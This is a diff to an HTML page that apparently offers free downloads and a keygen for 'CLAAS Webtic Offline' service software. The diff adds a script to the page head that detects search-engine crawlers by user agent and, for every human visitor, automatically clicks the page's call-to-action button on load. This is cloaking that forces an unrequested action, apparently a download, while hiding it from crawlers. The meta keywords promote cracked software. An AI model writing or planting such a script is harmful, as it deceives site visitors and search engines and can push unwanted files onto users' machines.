@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CLAAS Webtic Offline 09.2024 EN</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="CLAAS Webtic Offline 09.2024 EN offers unlimited access to vital repair manuals and service documents for CLAAS machinery. Download now.">
     <meta name="keywords" content="CLAAS Webtic Offline 09.2024, CLAAS Webtic Offline operator manual, CLAAS Webtic Offline repair manual, CLAAS Webtic Offline service documentation, CLAAS Webtic Offline download, CLAAS Webtic Offline free download, CLAAS Webtic Offline лицензия, CLAAS Webtic Offline скачать бесплатно, CLAAS Webtic Offline 2024, CLAAS Webtic Offline English, CLAAS Webtic Offline Deutsch, CLAAS Webtic Offline Espanol, CLAAS Webtic Offline Francais, CLAAS Webtic Offline Italiano, CLAAS Webtic Offline Polski, CLAAS Webtic Offline Roman, CLAAS Webtic Offline Pycc, CLAAS Webtic Offline all regions, CLAAS Webtic Offline Windows, CLAAS Webtic Offline CLAAS machinery, CLAAS Webtic Offline maintenance, CLAAS Webtic Offline training documents, CLAAS Webtic Offline technical data, CLAAS Webtic Offline assembly instructions, CLAAS Webtic Offline repair instructions, CLAAS Webtic Offline high speed download, CLAAS Webtic Offline keygen, CLAAS Webtic Offline скачайте бесплатно, CLAAS Webtic Offline multi-language, CLAAS Webtic Offline CLAAS equipment, CLAAS Webtic Offline сервисная документация, CLAAS Webtic Offline pdf, CLAAS Webtic Offline pdf download">
     <style>
